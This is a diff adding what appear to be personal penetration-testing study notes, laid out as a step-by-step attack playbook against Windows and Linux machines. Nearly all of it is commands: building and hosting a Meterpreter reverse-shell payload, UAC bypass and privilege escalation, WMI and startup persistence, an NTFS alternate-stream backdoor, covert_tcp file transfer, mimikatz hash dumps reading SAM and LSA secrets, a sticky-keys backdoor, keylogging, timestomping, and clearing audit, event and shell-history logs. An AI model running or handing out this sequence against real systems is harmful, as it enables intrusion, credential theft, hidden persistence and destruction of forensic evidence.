@@ -1,0 +1,175 @@
+1. Gain Access.
+
+i. Responder #gain password 
+responder -I eth0
+
+ii. L0phtCrack -  #Gives password of other users in computer.But requires username and password.
+
+iii.vnc - (screen of target)
+msfvenom -p window/meterpreter/reverse_tcp  --platform windows -a x86 -f exe LHOST=<<ip address>> LPORT=4444 -o <<exe filename>>
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp test.exe /var/www/html/share
+service apache2 start
+use exploit/multi/handler
+set payload window/meterpreter/reverse_tcp
+set LHOST 
+set LPORT
+exploit
+sysinfo  #info of device
+getuid
+shell  #shell accesss
+upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1  #check for privelege escalation
+run vnc
+
+iv. Armitage (Metasploit)
+Pentesting --> Exploitation Tools --> Metasploit Framework --> Armitage
+Hosts --> Nmap Scan --> Intense Scan 
+
+v. Ninja-Jonin
+Ninja  - constants.json #change ip and send the folder
+Jonin - listener
+list #list connected device
+connect 1
+vi Exploit Database
+
+3. Maitain Access
+i. Powerspy  #Install on victim system.Spy on victim.Start Monitoring and Stealth Mode.
+ii. SpyAgent
+iii. NTFS - Hide Data
+a. Create folder
+b. Create notepad file and calculator in it
+c. cmd.  type c:\<<folder name>>\calc.exe > c:\<<folder name>>\file.txt:calc.exe
+d. delete calculator file
+e. mklink backdoor.exe file.txt:calc.exe
+f. backdoor.exe
+
+iv. Stegnography
+a.snow
+i. Notepad (with content)
+snow -C -m "Message to hide" -p "magic" <<file to hide data in>> <<new filename>>
+snow -C -p "<<password>>" <<new filename>> #extract file
+b. Open Stego(tool)
+c. steghide 
+steghide extract -sf test.bmp
+d. StegOnline
+
+v. Autostart
+
+a. get session using metasploit
+b. background
+c. exploit/windows/local/bypassuac_fodhelper #bypass uac
+d. set Session 1
+e. exploit
+d. getsystem -t 1 #privilege escalation
+e. create new payload.exe file on other port and upload it in C:\\ProgramData\\Start Menu\\Programs\\Startup
+f. create a new metasploit listener.
+
+vi.Privilege Escalation and maintain persistence using WMI
+create 2 malicious file
+get session using metasploit with file 1
+load powershell
+powershell_shell #load powershell
+Import-Module ./WMI-Persistence.ps1
+Install-Persistence -Trigger Startup -Payload "2ND file path" in target
+create a new metasploit  #now 1st session closes and whenever machine starts, session is created
+
+vii. Covert_tcp:
+a. create folder and make a notepad file.
+b. install covert_tcp tool there
+c. cc -o covert_tcp covert_tcp.c
+d. In machine 2 create folder, install covert_tcp tool there
+e. cc -o covert_tcp covert_tcp.c
+f. Machine 1: ./covert_tcp -dest <<machine 2 ip>> -source <<machine 1 ip>> -source_port 8888 -dest_port 9999 -file <<txt file path>>
+g. Machine 2: ./covert_tcp -dest <<machine 2 ip>> -source <<machine 1 ip>> -source_port 8888 -dest_port 9999 -server -file <<txt file path to save>>
+
+
+4. Clear Logs:
+
+i. Auditpol:
+auditpol /get /category:*  #view auditlogs
+auditpol /set /category:"system":"account logon" /success:enable /failure:enable  #enable
+auditpol /clear /y  #clear audit policies
+
+ii. Clear_Event_viewer_logs.bat file #run as administrator
+wevtutil el  #windows enumerate logs
+wevtutil cl system #select any log and clear
+cipher /w:c;  #clear the backup encryption file
+
+iii. Clear linux logs
+export HISTSIZE=0 #no commands to save
+history -c  #clear stored history
+history -w  #clear history of current shell
+shred ~/.bash_history  #make file unreadable
+
+iv. Hide 
+Windows:
+attrib +h +s +r <<folder name>>  #hide directory
+attrib -s -h -r  <<folder name>>  #visible directory
+net user Test /add
+net user Test /active:no  
+Linux: 
+touch .file.txt  #create hidden files
+ls -la  #view hidden file
+
+v. CCleaner - #Clear Windows Machine Logs
+
+2. Privelege Escalation:
+
+i. Misconfigured nfs
+nmap -p 2049 -sV <<ip address>>
+sudo apt-get install nfs-common
+showmount -e <<ip address>>
+sudo mount -t nfs <<ip address>>:/<<mount directory name>> /tmp/nfs
+sudo cd /tmp/nfs
+sudo cp /bin/bash .
+sudo cp /bin/nano .
+sudo chmod +s bash
+connect the target using ssh
+cd to mount directory
+./ bash -p #run bash in target
+ls -la
+id   <<id's of users>>
+./ nano  -p /etc/shadow
+find / -name "*.txt" -ls 2> /dev/null
+
+2. Bypass UAC and Sticky keys.
+meterpreter session
+background
+bypassuac_fodhelper
+set session 1
+set TARGET 0
+getsystem -t 1
+background 
+use post/windows/manage/sticky_keys
+set session 2
+exploit  #in target pc click shift 5 times
+
+3. Get hashes of users using mimikatz
+i. privilege escalation using bypassuac_fodhelper
+ii. load kiwi #mimikatz
+iii. help kiwi
+iv. lsa_dump_sam  #NTLM Hash of all users
+v. lsa_dump_secrets #LSA Secret Login Hashes
+vi. password_change  -u Admin -n <<HASH OF Password from previous steps>> -P <<new password>>
+
+4. Client Side Vulnerabilities
+meterpreter session 
+upload beroot.exe
+shell
+beRoot.exe  #service name information, keys, permissions, writable directories, locations, WebClient Vulnerabilities
+upload seatbelt.exe
+shell
+seatbelt.exe -group=system  #antivirus, applock info
+seatbelt.exe -group=user  #cloud credentials, chromium presence
+seatbelt.exe -group=misc  #Chromium History, Chromium Bookmarks, FileInfo,Explicit Logon Info
+privilege escalation
+run post/windows/gather/smart_hashdump
+
+5. Hack Windows Machine
+meterpreter session
+timestomp file.txt -m "Date time" #change MACE Info
+keyscan_start  #keylogger
+shell 
+dir /a:h  #hidden directories
